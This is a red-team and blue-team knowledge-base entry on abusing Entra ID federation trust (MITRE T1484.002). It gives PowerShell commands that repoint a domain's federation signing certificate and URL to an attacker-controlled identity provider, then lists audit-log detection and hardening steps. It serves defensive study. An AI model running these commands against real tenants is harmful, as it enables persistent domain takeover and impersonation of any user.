# [PE-POLICY-006]: Federation Trust Relationship Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-POLICY-006 |
| **MITRE ATT&CK v18.1** | [Domain Policy Modification (T1484.002)](https://attack.mitre.org/techniques/T1484/002/) |
| **Tactic** | Privilege Escalation / Persistence |
| **Platforms** | Hybrid AD / ADFS |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** This technique involves modifying the **Federation Settings** in Entra ID to point to an attacker-controlled Identity Provider (IdP) or modifying the **Claim Issuance Rules** on the on-prem ADFS. By changing the `IssuerUri` or `SigningCertificate` in Entra ID (via `Set-MsolDomainFederationSettings`), an attacker can force Entra ID to accept tokens signed by their own rogue IdP for *any* user in the federated domain. This essentially creates a permanent backdoor that survives password resets.
- **Attack Surface:** Entra ID Federation Config.
- **Business Impact:** **Domain Takeover**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Global Administrator or Hybrid Identity Administrator.
- **Tools:**
    - [AADInternals](https://github.com/Gerenios/AADInternals)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Convert Domain to Federated**
(If not already).
```powershell
Set-MsolDomainAuthentication -DomainName target.com -Authentication Federated ...
```

**Step 2: Backdoor Federation**
Update the settings to point to an attacker-controlled server (e.g., running AADInternals).
```powershell
Set-MsolDomainFederationSettings -DomainName target.com -SigningCertificate <EvilCert> -LogOffUri <EvilURL>
```

**Step 3: Login**
Authenticate as `admin@target.com`. Entra ID redirects to the evil URL, which mints a valid token.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **AuditLogs** | `Set domain authentication` | Changes to `FederationSettings`, specifically `SigningCertificate` or `IssuerUri`. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Monitor:** Alert on ANY modification to domain federation settings. These are extremely rare events.
*   **Cloud Only:** Migrate to Cloud Authentication (PHS) to remove this attack surface entirely.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-001]
> **Next Logical Step:** [CA-FORGE-001]
